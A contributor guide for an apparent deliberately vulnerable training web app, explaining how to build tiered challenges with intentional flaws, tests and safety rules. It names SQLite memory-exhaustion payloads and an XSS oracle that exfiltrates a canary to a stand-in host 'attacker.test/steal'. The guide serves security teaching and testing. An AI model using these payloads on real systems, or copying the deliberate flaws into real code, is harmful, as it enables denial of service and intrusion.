# HVWA challenge recipes

How to add a challenge. The worked example is **GK-01 SQLi Login Bypass**
(`src/districts/gatekeeper/gk-01-sqli-login/`): copy its shape, not just its idea.

A challenge is one flag-bearing task, playable at up to four levels. The engine
(`src/core/*`) mounts it, serves its source and diff, issues and checks flags,
and draws the lab bar. The challenge supplies metadata, level code, views and tests.

## 1. Folder pattern

The folder is `<id lowercased>-<slug>` (GK-01 + `sqli-login` = `gk-01-sqli-login`).

```
src/districts/<district>/<id lowercased>-<slug>/
  challenge.ts        metadata + mount(): routes that dispatch to the level module
  model.ts            schema, seed, row types, the level-module interface,
                      lab state (perLevel / perSession) and test seams
  levels/acolyte.ts   one file per implemented level; ONLY these are served
  levels/templar.ts   (View Source shows them verbatim, Diff compares the
  levels/inquisitor.ts lowest exploitable level with divine.ts)
  levels/divine.ts    the secure reference
  views/*.ejs         rendered only through sendPage()
  fixtures/           optional: deliberately binary/malformed lab files
  <id>.spec.ts        the exploit matrix + challenge-specific tests
src/districts/<district>/_shared/   optional: plumbing several labs of the district share
                                    (e.g. gatekeeper/_shared/lab.ts: welcome(), accounts, the admin page)
src/districts/_shared/              plumbing labs of EVERY district share (below): Result, curl, bounded maps, test kits
src/districts/<district>/index.ts   imports each challenge.ts (registration side effect)
src/districts/index.ts              imports each district index
```

- Level files import types from `../model.js`, never from `../challenge.js`. A victim-driven lab may gather its level
  modules (`byLevel`) in `model.ts`, because its citadel handler needs them (section 8); its level files then import
  ONLY types from `model.ts` (a runtime import would be an ESM cycle), and take shared values from `_shared/` or local
  constants.
- **A victim-driven lab may keep its page functions and its citadel handler in `model.ts`** (GK-10, GK-11, GK-16): the
  functions both browsers' requests go through (`startLogin`, `authorize`, `callback`, `portalSignIn` ..., each taking a
  `Visit` and answering a `Reply`, section 8) and `citadel(level, state, r)` live next to the lab state and `byLevel`,
  and `challenge.ts` keeps the metadata, the victim actions and the real routes. They are plumbing: every decision the
  lesson is about is a call into `impl.for(level)`, so the flaw stays in `levels/*.ts`.
- Everything the vulnerability needs lives in the level file, so View Source
  and the Diff tell the whole story. `challenge.ts` and `model.ts` are plumbing.
  **One deliberate exception: error verbosity.** `tryDb` in `challenge.ts`
  decides it (the real message below Divine, a generic one at Divine), so say so
  in `divine.ts`'s comment, where Diff readers will see it.
- Shared plumbing goes in `_shared/`; the flaw itself (limiter, lockout, token generator) never does:
  it stays in the level files so View Source and the Diff show it.
- **District shells, per lab shape.** Labs of one shape (login, JWT, ...) share a shell in
  `_shared/<shape>-lab.ts`: the routes, cookie, vault and other plumbing, driven by callbacks
  (`issue`, `verify`, `blurb`, `links`). Shared views live in `_shared/views/`. A shell never holds policy:
  every verification rule, filter or limiter stays in the lab's own `levels/*.ts`, and lab-specific routes
  (a published key, a wordlist) stay in its `challenge.ts`. Worked example: `gatekeeper/_shared/jwt-lab.ts`
  (`mountJwtPortal`) used by GK-04 to GK-07. Keep the lab seams uniform across the shape
  (e.g. `issueToken(req, claims)`, `mintToken(sessionId, level, claims)`).
- **Test kits.** Tests every lab of a shape repeats live once in `_shared/<shape>-lab.testkit.ts` (suffix
  `.testkit.ts`, never `.spec.ts`: a spec would be collected on its own and registered once per importer).
  Vitest collects only `*.spec.ts`; `tsconfig.json` excludes `src/**/*.testkit.ts`, so test code never reaches
  `dist/`, while `tsconfig.test.json` still type-checks it (`tests/tooling.spec.ts` asserts all three). A lab's
  spec calls the kit's `describe...` function. Worked example: `gatekeeper/_shared/jwt-lab.testkit.ts`
  (`describeJwtLabBasics`).
- **Plumbing for every district: `src/districts/_shared/`.** A district never imports another district's `_shared/`;
  what two districts need lives here. Like any `_shared/`, it never holds a flaw.
  - `result.ts`: `Result` (`{ ok, text }`), the lab message a view shows as `lab-message lab-success|lab-error`.
  - `curl.ts`: `curlFor(req, res, { path, method?, headers?, cookies?, data?, form? })` → `CurlView`, `shellQuote(text)`,
    with the partial `views/curl-note.ejs`: a curl line that can work. It carries the full quoted URL, `-X <method>`
    (PUT, PATCH ...), the headers it needs, `-d '<json>'` and/or `--data-urlencode 'name=value'` (values are
    shell-quoted), and `-b "hvwa_sid=<copy from devtools>"`. Never print the sid: a lab belongs to the browser session,
    so curl without that cookie plays in another session whose flags `/api/submit` from the browser would reject. The
    partial also says the line is bash syntax and that Windows PowerShell needs `curl.exe` (plain `curl` there is
    `Invoke-WebRequest`). A lab view at `src/districts/<district>/<lab>/views/` (or `<district>/_shared/views/`)
    includes it with `<%- include('../../../_shared/views/curl-note', { curl: curl }) %>`.
  - `collections.ts`: bounded maps and ids for lab state (section 4, "Bound every map"): `newId()` (16 CSPRNG bytes,
    32 hex), `putBounded(map, key, value, max, keep?)` (store newest last; beyond `max` the oldest key `keep` does not
    pin goes) and `trimBounded(map, { max, pin?, spare? })` for a lab that inserts elsewhere and trims later (`pin`:
    never evicted, e.g. the admin's session; `spare`: evicted only when nothing else can go, e.g. signed-in sessions
    after anonymous ones). Each lab states its own rule: GK-10/11 pin the admin's session, GK-16 spares signed-in ones.
  - `url.ts`: `withParams(uri, params)`: `uri` with `params` appended to its query, as an authorization server
    appends a code (the uri otherwise left as given, a fragment kept last). Build such URLs with it, never by
    concatenating `${uri}?code=` (that breaks a uri that already has a query or a fragment).
  - `curl.testkit.ts`: `describeCurlExample({ challenge, path, curl: (level) => ExpectedCurl })`, the front page's curl
    line at every level. `curl.spec.ts` tests the helpers and the partial.
  - `victim-lab.testkit.ts`: the victim-lab test kit (section 8, Testing).
- **Shared pieces of the pilgrim labs** (sign in as `pilgrim`, take over the admin's data or page: GK-12 ... GK-18),
  all in `gatekeeper/_shared/`:
  - `pilgrimLogin(req)` + the `views/pilgrim-form.ejs` partial: the sign-in check, form and message.
  - `accountOf(username, password, adminPassword)` (the admin with this lab's password, pilgrim/pilgrim, or undefined)
    and `roleOf(username)` (for `welcome()`), shared by labs with their own sign-in (GK-10, GK-11).
  - `curlFor`, `shellQuote` and `Result` are re-exported from `gatekeeper/_shared/lab.ts`, so Gatekeeper code imports
    them from there; they live in `src/districts/_shared/` (above).
  - `sendAdminPage(res, { admin, granted, denial, flag?, pre?, denyStatus? })` + `views/admin.ejs`: the admin page.
    **A denial is 403 by default**; pass `denyStatus` only with a reason. (GK-17 passes `denyStatus: 200`: that is a
    Batch A exception from before the default existed. Do not copy it.) Pass `flag: { req, challenge }` and the page
    appends the flag line itself, only when `admin` is true, and Divine's rule is built in: "Welcome back." instead of
    a flag, whatever the lab passes. `flagLine(req, challenge)` is the same line for a lab that builds its own page.
    (It stays in Gatekeeper: "Welcome back." at Divine is this admin page's wording, not every district's.)
    The lab's real access check still lives in `levels/*.ts`.
  - The test kit `pilgrim-lab.testkit.ts`: `describePilgrimLab`, `newCtx`, `pilgrimClient`, and `describeCurlExample`
    (re-exported from `src/districts/_shared/curl.testkit.ts`).
  Views include the Gatekeeper partials with `<%- include('../../_shared/views/pilgrim-form', { ... }) %>` and the curl
  partial with `<%- include('../../../_shared/views/curl-note', { curl: curl }) %>`.
- **Pilgrim-ID, the identity provider of the OAuth labs** (GK-10, GK-11), in `gatekeeper/_shared/oauth.ts`: besides
  `CLIENT_ID`, `CODE_TTL_MS`, `newVerifier()`, `s256()`, `IssuedCode`, `Exchange` and `withParams()` (re-exported
  from `src/districts/_shared/url.ts`), its sign-in and
  `/idp/authorize` are shared as a shell driven by callbacks, like `mountJwtPortal`: a lab declares
  `const PILGRIM_ID: PilgrimId<LabState> = { cookie, adminPassword, pinnedSession?, maxEntries, policy }` and calls
  `pilgrimIdSignIn(PILGRIM_ID, v, state, username, password)`, `pilgrimIdAuthorize(PILGRIM_ID, v, state)` and
  `pilgrimIdUser(PILGRIM_ID, v, state)`. The lab state holds `idpSessions`, `codes` and `world` (`PilgrimIdState`).
  `policy(level)` returns the `PilgrimIdPolicy` (`allowRedirect(uri)`, `checkPkce(challenge, method)`): GK-10 passes
  `(level) => impl.for(level)`, so its flaw stays in `levels/*.ts`; GK-11, whose Pilgrim-ID is sound, passes its fixed
  rules.
- `fixtures/`: any path segment named `fixtures` is exempt from the repo
  hygiene scan (UTF-8, no control characters). Non-`.ts` files there are copied
  into `dist/` by `copy-assets`.

## 2. The four levels

| Level | Means | Example (GK-01) |
|---|---|---|
| **Acolyte** | No defense | both fields concatenated into SQL |
| **Templar** | Naive filter / blacklist | quotes stripped from the username only |
| **Inquisitor** | Real defense, subtly flawed | parameterized, but the password is compared with `LIKE` |
| **Divine** | Correct for the weakness under study; other gaps noted in a comment | parameterized, exact comparison, generic errors; the comment notes that hashing and rate limiting are out of scope; never issues a flag |

Each exploitable level needs its own exploit, and each level is a step up: the
exploit for a level must fail at the next implemented level above it (matrix
case (g)). Divine resists every exploit.

## 3. Engine helpers

| Helper | From | Use |
|---|---|---|
| `defineChallenge(input)` | `core/registry` | validate metadata, default `points` (100) and `check` (level-bound flag) |
| `register(c)` | `core/registry` | add to the registry (rejects duplicate id or route), deep-freeze |
| `challengeDir(import.meta.url)` | `core/source` | the `dir` field: the folder holding `levels/` |
| `byLevel<M>({ acolyte, templar, inquisitor, divine })` | `core/lab` | gather the level modules against one interface `M`; `.levels` (rank order) goes to `defineChallenge`, `.for(req.level)` picks the module. Omit levels you do not implement |
| `perLevel(factory)` | `core/lab` | one lazily created instance per level, shared by all players: `.for(level)` |
| `perSession(factory, { maxEntries?, idleTtlMs? })` | `core/lab` | one lazily created instance per (session, level) via `factory(level, sessionId)`: `.for(req)` |
| `perSession(...).reset(req)` | `core/lab` | drop that (session, level)'s instance (calls `dispose`): the body of a lab's `reset` hook |
| `labPath(res)` | `core/lab` | the canonical lab path `/d/<district>/<slug>`, set by the engine as `res.locals.labPath` (also readable in views as `labPath`); use it for every lab link and cookie path |
| `header(req, name)` | `core/lab` | a request header as a string (`undefined` if missing or repeated); client-written, never an identity |
| `fixtureLines(url)` / `sendLines(res, lines)` | `core/lab` | a lab's fixture list read once (`new URL('./fixtures/x.txt', import.meta.url)`) and served from a lab route as `text/plain` |
| `challengeDb(schema, seed?)` | `core/challenge-db` | private in-memory SQLite, `prepare()`-only facade; `randomblob()`/`zeroblob()` capped at `CHALLENGE_BLOB_CAP` (64 KiB, section 4) |
| `tryDb(req, () => call(), label?)` | `core/lab` | `{ ok: true, value }` or `{ ok: false, message }`: `<label>: <msg>` below Divine (label defaults to `Database error`), `Invalid request.` at Divine. Synchronous only: a Promise result throws |
| `field(req, name)` | `core/lab` | a body field as a string, `''` for missing or non-string values |
| `flagFor(req, challenge)` | `core/mount` | this session's flag at the served level; throws at Divine |
| `sendPage(res, viewFile, data)` | `core/render` | the only way to render (absolute `.ejs` path) |
| `simWorld({ mailboxes })`, `world.browser(handler)` | `core/sim` | victim-driven labs: one player's inbox, attacker log and the victim's browser, made inside the lab's `perSession` factory (section 8) |
| `defineChallenge({ victim: { sim, actions } })`, `VICTIM_LABELS` | `core/registry`, `core/sim` | the victim's buttons (`POST <lab>/victim/<name>`, 303 back) and the inbox / attacker-log panel under every lab page (section 8) |
| `classifySimUrl(url, base?)`, `labHref(u, base, level)` | `core/sim` | where a URL really takes the victim's browser (`citadel` / `attacker` / `other`); a citadel URL as a link into the lab (section 8) |
| `checkMailAction({ browser, mailbox, link?, rearm })`, `sendLinkAction(browserFor, { rearm })` | `core/sim` | the two usual victim actions, with a required re-arm step at the start of each (section 8) |
| `sendSimRedirect(res, location, status?)` | `core/sim` | a real route answering a level's redirect: a citadel URL goes to the same place in the lab, anything else gets a "your browser would go to ..." page, never a real redirect off the lab (section 8) |
| `Reply`, `toSim(reply)`, `sendReply(res, reply, render)`, `cookiePath(base)`, `TwinCookie` | `core/sim` (`core/twin.ts`) | one page answer for both browsers: a `SimResponse` for the citadel handler, the real route's answer (cookies with their attributes, redirects through `sendSimRedirect`, a forward as a note) (section 8) |
| `visitOf(req, res, cookieNames)`, `simVisitOf(level, r, cookieNames?)`, `Visit` | `core/sim` (`core/twin.ts`) | what a page function needs from either browser's request: level, raw query, the lab's own cookies, `base` (section 8) |
| `REDIRECT_STATUSES` | `core/sim` | the statuses a browser follows a `Location` on (301, 302, 303, 307, 308) |
| `newMarker()`, `xssBrowser(world, handler, { marker, canary, interact?, dom? })`, `XSS_STEAL_URL` | `core/xss` (`core/victim.ts`) | XSS labs: the player's marker call per player and level, and the admin's browser whose rendered pages run through the oracle; a payload that runs sends `GET http://attacker.test/steal?c=<canary>` to the attacker log (section 9) |
| `previewFrame(fragment, { marker?, title?, hash? })` | `core/xss` | the vulnerable fragment, live for the player, inside `<iframe sandbox="allow-scripts" srcdoc>`; the only raw output of an XSS view (section 9) |
| `xssOracle(html, marker, opts?)`, `linkSinks(html)`, `roundTrip(html)`, `XSS_LIMITS` | `core/xss` | the static oracle itself (sinks, marker, mXSS), the links and resources a mail would load, a sanitizer's fixed-point seam, the bounds (section 9) |

`req.level` on a challenge route is already clamped to the implemented levels;
`req.sessionId` and `req.lang` are typed. `res.locals.challenge` and
`res.locals.level` feed the layout's lab bar.

### GK-01, condensed

```ts
// model.ts
export interface LoginLevel {
  findUser(db: ChallengeDb, username: string, password: string): UserRow | undefined;
}
const users = perLevel(() => {
  const adminPassword = randomBytes(16).toString('hex');
  const db = challengeDb(SCHEMA, (raw) => { /* seed citadel_admin + pilgrim */ });
  return { db, adminPassword };
});
export const usersDb = (level: Level) => users.for(level).db;
export const adminPassword = (level: Level) => users.for(level).adminPassword; // test seam

// challenge.ts
const impl = byLevel<LoginLevel>({ acolyte, templar, inquisitor, divine });
export const GK01 = register(defineChallenge({
  id: 'GK-01', district: 'gatekeeper', slug: 'sqli-login', dir: challengeDir(import.meta.url),
  levels: impl.levels, /* title, summary, maps, hints */
  mount: (router) => {
    router.get('/', (_req, res) => sendPage(res, view, { account: PLAYER, result: null, username: '', password: '' }));
    router.post('/', async (req, res) => {
      const username = field(req, 'username');
      const password = field(req, 'password');
      const db = usersDb(req.level);
      const level = impl.for(req.level);
      const found = tryDb(req, () => level.findUser(db, username, password)); // DB call only
      // ... flagFor(req, GK01) only for an admin row below Divine, OUTSIDE tryDb
      await sendPage(res, view, { account: PLAYER, result, username, password });
    });
  },
}));
```

For a shape with a shell, a lab's `challenge.ts` shrinks to metadata, the shell call
(`mountJwtPortal(router, { challenge, blurb, issue, verify, ... })`) and its own routes; see section 1.

## 4. Platform rules

**(a) Render only with `page()` / `sendPage()`** from `core/render.ts`, never
`res.render()` or a two-argument `ejs.renderFile` with request data (EJS option
injection would reach the host process). View data may not use the reserved
keys: `escapeFn include rethrow __append __output locals body t lang challenge level labBar labPath simPanel`.

**(b) The vulnerability lives only in the challenge's own surface**: its level
files, its `challengeDb`, its simulated sandbox. Never in shared platform code.
The platform and Divine stay secure.

**(c) A custom `check()`** follows the contract in `registry.ts`: true only for
the level the submission proves, side-effect free, no platform DB.

**(d) Read the level from `req.level`.** Divine never issues a flag (`flagFor`
throws there). Call `flagFor` outside `tryDb`, so an engine error reaches the
stack-free error handler instead of being shown as a "database error".

**(e) Attacker input reaches a challenge DB only through `challengeDb`'s
`prepare()`**, never a raw `exec()`. The seed callback may use the raw handle.

**(f) Labs whose exploit mutates state** (lockout counters, OTPs, balances,
roles, coupons, stored XSS, memory poisoning...) keep that state in
`perSession()`, so one player's exploit never changes another player's lab.

**(g) Never rely on genuinely slow SQL.** `node:sqlite` is synchronous with no
query timeout: a heavy injected query blocks the whole server. Time-based labs
evaluate the injected condition, then `await` a simulated delay. Labs that run
fully attacker-chosen SQL must also cap result size.

**SQL memory bombs.** `node:sqlite` (Node 22) has no `sqlite3_limit()`, so SQLite's own `randomblob(n)` and
`zeroblob(n)` make blobs of up to 1 GB in one call: one injected `randomblob(900000000)` allocates 900 MB, and the app
container has 512 MB. `challengeDb` therefore registers capped overrides of both on EVERY challenge DB, before the schema
and seed run (an application-defined function takes precedence over the built-in): they return at most
`CHALLENGE_BLOB_CAP` (64 KiB) and behave like the built-ins below it. Labs need do nothing, must not depend on bigger
blobs, and a seed must never re-register either function uncapped. **What the cap does and does not do:** it removes
the textbook payload (`randomblob(900000000)`) and the heavy-query timing trick built on it (a big `randomblob` as a
delay in blind SQLi). It does NOT make a single injected call memory-safe in general. Measured on Node 22.22 / SQLite
3.50.4, each of these is ONE statement: `printf('%0900000000d', 1)` adds about 1.7 GB, `replace(hex(zeroblob(65536)),
'0', hex(zeroblob(4000)))` about 1 GB (one `replace()` call), and `group_concat` over a 4000-row recursive CTE about
1 GB. `PRAGMA hard_heap_limit` does nothing in Node's bundled SQLite (and `prepare()` refuses PRAGMA anyway). These
remain an **accepted self-DoS gap of a loopback, single-player lab**: the only player who can send them stops their
own app (restart the container), so they are documented, not mitigated. Rule (g) still applies on top: a lab that runs
fully attacker-chosen SQL caps what it returns (rows read, text shown).

**Lab state: `perLevel` or `perSession`.** Never a bare module-level
`challengeDb` for a lab that holds a secret or state.

- `perLevel(factory)`: read-only labs whose data the exploit only reads, but
  where a secret (password, token, signing key, coupon code) must not cross
  levels. One instance per level, shared by every player. In GK-01 an admin
  password dumped by Acolyte SQLi earns the Acolyte flag (a legitimate attack
  path) but logs in nowhere else.
- `perSession(factory, { maxEntries, idleTtlMs })`: anything an exploit (or
  normal play) mutates. One instance per (session, level), so it already
  isolates levels: do not wrap it in `perLevel`. Memory is bounded: least
  recently used instances beyond `maxEntries` (default 5000) are evicted, and
  instances idle longer than `idleTtlMs` (default 26 h) are dropped. A dropped
  lab is rebuilt fresh on the next request, so labs must tolerate a reset.
  An optional `dispose(value)` runs when an instance is evicted or expires (to
  release a resource; its errors are swallowed). The bound is per `perSession`
  holder, so the worst case is `maxEntries` x the number of stateful labs: fine
  for a loopback single-player lab. Holders that keep simulated-victim state share one smaller, process-wide
  budget instead (section 8).
  **Eviction and TTL expiry are a reset** (counters, locks and secrets are rebuilt), so a lab with limiters must
  survive neither: (a) `idleTtlMs` must exceed the longest lock or lockout the lab uses (the default 26 h is
  longer than the 24 h cap of the Divine escalating locks; never lower it for such a lab); (b) creating
  instances is rate limited so an eviction flood is impractical: each holder allows `maxNewPerMinute` (default
  120) new instances a minute (`NewSessionLimitError`, HTTP 429, nothing evicted), and the app issues at most 60 new
  `hvwa_sid` a minute (`createApp({ maxNewSessionsPerMinute, sessionClock })`, 429 "Too many new sessions").
  With 5000 entries a flood needs about 42 minutes at the default rate. Holders live at module level, so every app in a spec file shares them and fresh apps do NOT reset the limit. Tests
  therefore run with the per-holder default lifted to `Infinity` (`setPerSessionDefaults` in `src/core/lab.ts`, called
  from `tests/support/setup.ts`); a holder with an explicit `maxNewPerMinute` keeps it, so a limit test must pass it
  (or set the default itself). Any per-session store (an inbox, an attacker log, ...) must go through `perSession` so it
  inherits these limits; never keep your own Map keyed by session id.

**Restart lab (rare).** A lab whose state can get *stuck* (a hijacked or poisoned session, stored-XSS cleanup, a
wedged workflow) may pass `reset: (req) => holder.reset(req)` to `defineChallenge`. The engine then mounts
`POST <lab>/_reset?level=<level>` (calls the hook, answers 303 back to the lab) and the lab bar shows a
"Restart lab" button. Reset only the served level. The route has a per-(session, level) cooldown
(`resetCooldownMs`, default 10 s, answers 429 while cooling; tests inject `createApp({ resetClock })`), a safety net
and not a licence for the rules below.

**Restart must never refill a budget.** It must not refill an attempt budget, clear a lockout or limiter, or
re-roll a guessable secret while clearing counters: "reset, guess 5 times, repeat" would beat every level without
its designed flaw (the session survives a restart, so flags stay earnable). Therefore **labs with limiters,
lockouts, OTP counters or attempt budgets must not define `reset`**: their state must heal on its own (locks expire,
a sign-in issues a new code). Say it in the spec: `POST <lab>/_reset` is 404, and N failures + a reset attempt +
the real secret is still refused with no flag (GK-02, GK-03, GK-15). GK-17 keeps Restart because it touches no limiter.

**Every lab answers `GET /` at every implemented level** with 200, rendered
with `sendPage` (so it has the lab bar); the `labs.spec.ts` smoke test and
`verify:dist` request it, each through one cookie jar like a browser (section 6). **API-only labs** (the Archive API district) still
serve an HTML landing page at `GET /` describing their endpoints (method, path,
an example request), and mount the API itself on sub-paths.

**Errors.** Wrap only the DB or parser call in `tryDb`. Below Divine the real
message is shown on purpose (error-based learning, CWE-209); Divine shows a
generic message. Parser labs (XXE, YAML) pass a label:
`tryDb(req, () => parse(xml), 'Parser error')`. `fn` must be synchronous
(`node:sqlite` is); `tryDb` throws if it returns a Promise. Read body fields
with `field()`, so a JSON object or extended-urlencoded nesting is an empty
string, not a 500.

**Lab links and cookies.**

- **Links are absolute, built from `labPath`.** Never a relative `href` (`wordlist.txt` on
  `/d/gatekeeper/brute-force` resolves to `/d/gatekeeper/wordlist.txt`), and never `req.baseUrl`: it echoes the
  request's spelling (`/D/GATEKEEPER/...`), which gives wrong links and cookie paths. Pass `base: labPath(res)`
  to the view and include `?level=<level>` where the target is level-specific.
- **Lab cookies:** `Path` = `labPath(res)` (browsers match cookie paths case-sensitively); a distinct name per
  level (levels share the path and must not overwrite each other: `citadel_sid_<level>`); choose `httpOnly`
  deliberately (a session id: yes, and say in the view how to edit it, devtools storage or `curl -b`; a
  deliberately client-writable counter: no); never a name starting with `hvwa_` (the platform's). A victim-driven lab
  sets them through its `Reply` (`TwinCookie`: `httpOnly` and `sameSite` default to HttpOnly and Lax, section 8).
  Tests: `describeLabCookies` (`victim-lab.testkit.ts`) checks the name per level, the canonical path and HttpOnly.
- **A request without the lab's cookie must not change lab state.** Probing a page (an admin page, a wrong guess)
  must not mint sessions, advance generators or push activity entries; only the pages the player uses to get a
  session do. Pin entries the lab depends on (the admin's session, the admin's activity line) so trimming a list
  never drops them.
- **Bound every map keyed by attacker input** (header values, usernames, spellings): cap its size, hash long keys
  (`> 64` chars), and track only real accounts where the design allows it. A cap that evicts must not let the
  attacker flush a counter they care about (made-up names must not push the admin's counter out). Use the helpers in
  `src/districts/_shared/collections.ts` (section 1) rather than a hand-written loop: `putBounded(map, key, value, max,
  keep?)`, or `trimBounded(map, { max, pin?, spare? })` where entries are added elsewhere (a level file) and trimmed
  after; `pin` what the lab depends on, `spare` what should go last. A bound that is platform safety, not the lesson,
  belongs in `model.ts`.
- **Fixtures** (wordlists, leaked lists) live in `fixtures/`, are read once with `fixtureLines` and served with
  `sendLines`; the page links them by absolute path.
- **Limiters and lockouts must not be beaten by waiting.** A short window or a short lock turns a brute-force lab
  into "wait and retry" at every level, Divine included. Use long windows or locks (15 min or more) below Divine and
  an escalating per-account lockout at Divine (the fifth failure locks, every further one doubles it, capped), so
  that the designed bypass, not patience, is the practical path. Re-signing-in, resending a code or any other
  convenience flow must not hand the budget back either (add a "re-sign-in" scenario to the spec).
- **Time-dependent behaviour uses an injectable clock** (`state.now`, a test seam on the lab state), never
  `setTimeout`, `sleep` or real minutes: tests move the clock (`state.now = () => t`) and stay fast.

## 5. Views, language and hints

- **Language policy.** Content inside a lab (the vulnerable app's own headings,
  labels, messages) is English by design: it is a realistic target. All player
  guidance is bilingual (ID/EN): `title`, `summary` and `hints` are `Text`
  values; platform strings go in `core/i18n.ts`.
- **The lab bar is automatic.** The layout shows the id, title, summary, served
  level, a level switcher and a link back to `/c/<id>` on every challenge route,
  and defaults `<title>` to `<id> — <title>`. Do not repeat these in the view.
- **Lab views** (see `gk-01-sqli-login/views/login.ejs`): wrap the app in
  `<section class="lab">`; show messages in `<p class="lab-message lab-success|lab-error">`;
  tell the player their own account if the lab has one; use text inputs so
  payloads stay visible; keep submitted values (escaped) after a POST; post back
  to the lab with no `action` attribute.
- **Escape everything** with the escaped output tag. If the vulnerability is in
  rendering (XSS), the level module builds that one fragment (escaping it or
  not) and the view outputs only that fragment raw.
- **Never put an EJS tag inside an EJS comment.** The comment ends at the first
  closing delimiter and the rest breaks parsing. Describe tags in words.
- **Hints**: three tiers (typically cost 10/20/40), bilingual, each more
  specific, none containing a literal payload. Point at the mechanism (where
  input goes, which field is filtered, what a wildcard means). Phrase tier 3 as a
  guiding question ("what besides waiting makes the lock forget?", "who keeps the
  count?"), and make every tier add information the page does not already state.

## 6. Testing: the exploit matrix

Every challenge spec declares its matrix with `describeExploitMatrix` from
`tests/helpers.ts`; it generates named cases, one level each:

```ts
describeExploitMatrix<Creds>({
  challenge: GK01,
  path: '/d/gatekeeper/sqli-login',
  send: (agent, _level, creds, url) => agent.post(url).type('form').send(creds),
  exploits: { acolyte: {...}, templar: {...}, inquisitor: {...} }, // one per non-Divine level
  resisted: 'Invalid credentials.',            // the answer to an exploit at Divine (or a per-exploit-level map)
  legit: [{ name: 'own account', input: { username: 'pilgrim', password: 'pilgrim' }, expect: 'Welcome, pilgrim' }],
  malformed: [{ name: 'lone quote', input: { username: 'pilgrim', password: "'" }, levels: ['acolyte', 'templar'] }], // or []
  privileged: {                                 // or null
    name: 'real admin',
    input: { username: 'citadel_admin', password: adminPassword('divine') },
    expect: /Welcome, citadel_admin/,
  },
  // optional: cumulative: ['inquisitor'],      // see (g); explain why in the spec
  // optional: errorRe: /Parser error/,         // parser labs; default DB_ERROR_RE
});
```

`send` gets a fifth argument `{ sid }`, the case's session id, so stateful labs can
reach per-session test seams (a secret, a counter). One `send` may fire several
requests (a scenario: N failed logins, then the real one) and return the last response.

Required cases (generated):

- **(a)** `exploits` keys equal the challenge's non-Divine levels.
- **(b)** each exploit at its level shows a flag that `/api/submit` credits at exactly that level.
- **(c)** Divine answers every exploit with `resistedStatus` (default 200), the `resisted` text, no flag and no error text.
- **(d)** each `malformed` input shows error text at its listed levels and none at Divine.
- **(e)** each `legit` input works at every level: 200, expected text, no flag.
- **(f)** the `privileged` input (real credentials) works at Divine with no flag.
- **(g)** step-up: the exploit for each level is resisted (no flag) at EVERY
  implemented non-Divine level above it, so a regression two levels up is caught
  too (only "no flag" is required there, not the `resisted` text). On by default.
  `cumulative: [level]` skips that level for exploits from below, when they
  legitimately still work there; it must be explicit and explained in the spec.
  `resisted` may also be a map keyed by the exploit's level, when Divine answers
  different exploits differently (case (c) uses the entry for that exploit).

`resistedStatus` (optional, default 200) is the status Divine answers exploits with in (c): a
number, a non-empty list of accepted numbers, or a map keyed by the exploit's level (levels not
in the map expect 200). Use it for API-style or access-control labs (JWT APIs, IDOR, broken
access control) where a real 401/403/404 teaches more than a polite 200. Values must be integers
100-599, or setup throws. It changes only the status: Divine must still never show a flag or
error text, and the `resisted` text must still match. The other cases ((d)-(f)) keep asserting 200.

"Error text" is `errorRe` (default `DB_ERROR_RE`; pair `/Parser error/` with a
`tryDb` label). `malformed: []` and `privileged: null` are explicit opt-outs
for labs with no such errors or no privileged identity. Add challenge-specific
tests next to the matrix (GK-01: per-level isolation, view escaping, kept
values, non-string fields). `FLAG_RE` and `DB_ERROR_RE` are exported for them.

Test plumbing for stateful labs (all in `tests/helpers.ts`): `send(..., { sid, app })` for per-session test seams;
`bare(app, sid, 'name=value')` for requests that carry only the session cookie plus a cookie the lab did not
give you (the agent's jar always wins over a hand-set Cookie header, so never reach into supertest internals);
`runWarmupThenFinal(scenario, fire)` for "N failures, then the real secret"; and
`describeLabView({ ... })` (probes the first implemented non-Divine level; put every form field except the echoed one in `extra`) for the view basics every lab shares (own account told, no `type="password"`,
forms without `action`, escaped payload, odd bodies not a 500, message classes, upper-case URL uses the canonical
path). Do not write assertions inside an `if` that can pass vacuously: draw new sessions until the condition
holds, then assert unconditionally. Exploit scripts must detect success by "not the denial text", not only by a
flag, because Divine never shows one.

One server per app: `import request from 'supertest'` in a spec is aliased (`vitest.config.ts`) to
`tests/support/supertest.ts`, so `request(app)` / `request.agent(app)` with an Express app listen ONCE per app
(closed when the test ends) and reuse keep-alive sockets. Plain supertest starts a server and a connection per request,
which leaves thousands of sockets in TIME_WAIT and exhausts ephemeral ports (`EADDRINUSE` in unrelated specs). Keep
using `request` / `freshSession` / `bare` as usual; `serve(app)` (from `tests/helpers.ts`) returns the http.Server.
Pass the app, not a hand-made `http.Server`: `listen(port, host)` binds a tick later, and supertest would listen and
close a server with no address again on every request, so `request(server)` refuses one that is not listening yet.
Never deep-import or `require` the real supertest (`tests/tooling.spec.ts` fails if a spec does). Test servers listen on a random port on all interfaces for the length of a test (see `docs/SECURITY.md`): run tests on a trusted network.

One cookie jar per sweep: a request without `hvwa_sid` mints a new session, and the app issues at most 60 a minute
(429 beyond). A spec that sweeps many pages of one app (the `tests/labs.spec.ts` smoke test: every lab at every level)
keeps one `request.agent(app)`, like a browser and `verify:dist`, instead of a cookieless `request(app)` per page.

**Mutation self-check** before committing (revert by rewriting the file, not
`git checkout` over uncommitted work):

1. Make one exploitable level secure: its exploit case goes red.
2. Make Divine fall for an exploit: its resist case goes red.
3. Make Divine leak an error message: the Divine malformed case goes red.
4. Make Divine show a flag to the privileged user: the privileged case goes red. `flagFor` and `issueFlag` throw at
   Divine, so the mutant must emit a real flag string, e.g. `flagFor({ ...req, level: 'acolyte' }, C)` or a literal
   matching `FLAG_RE`; otherwise case (f) goes red on the 500, not on "no flag", and proves less.
5. Copy the level below over a level: its step-up case goes red.

If a mutation stays green, the matrix is missing a case.

## 7. New-challenge checklist

1. Read the catalog row (levels, standard mapping) and this file.
2. Write `<id>.spec.ts` first (matrix + specifics); run `npm test -- <id>` and watch it fail.
3. `model.ts`: schema, seed, row types, the level-module interface, `perLevel` or `perSession` state, test seams.
   A lab where someone else must click (a reset mail, an OAuth link, a session link) adds a simulated victim: section 8.
4. `levels/*.ts`: Acolyte no defense, Templar naive filter, Inquisitor flawed defense, Divine correct
   for the weakness; `divine.ts`'s comment notes generic errors and any gaps left out of scope.
5. `challenge.ts`: `byLevel<M>`, `register(defineChallenge({ ..., dir: challengeDir(import.meta.url), levels: impl.levels }))`,
   bilingual title/summary/3 hints, routes using `field`, `tryDb`, `flagFor`, `sendPage`. A victim-driven lab may keep
   `byLevel` in `model.ts` instead (its level files then import only types from it; section 8).
6. `views/*.ejs`: `.lab` markup, escaped output, English lab content (API-only labs: an HTML landing page).
